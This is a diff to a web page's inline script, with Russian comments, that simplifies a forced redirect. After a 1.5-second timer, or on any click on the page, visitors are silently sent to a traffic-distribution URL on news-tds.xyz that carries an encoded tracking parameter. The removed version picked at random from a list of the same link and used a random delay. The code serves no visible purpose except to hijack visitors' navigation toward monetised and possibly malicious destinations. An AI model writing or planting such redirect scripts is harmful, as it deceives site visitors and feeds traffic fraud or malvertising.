@@ -19,27 +19,17 @@ h2 {
 
 <script>
 
-// === СПИСОК ССЫЛОК ===
-let links = [
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0"
-];
+// === ТВОЯ ССЫЛКА ===
+let link = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
 
-// случайная ссылка
-let randomLink = links[Math.floor(Math.random() * links.length)];
-
-// случайная задержка (1200–2000 ms)
-let delay = Math.floor(Math.random() * (2000 - 1200 + 1)) + 1200;
-
-// редирект
+// редирект через 1500 ms (1.5 сек)
 setTimeout(function(){
-    window.location.href = randomLink;
-}, delay);
+    window.location.href = link;
+}, 1500);
 
 // клик по странице (fallback)
 document.addEventListener("click", function(){
-    window.location.href = randomLink;
+    window.location.href = link;
 });
 
 </script>
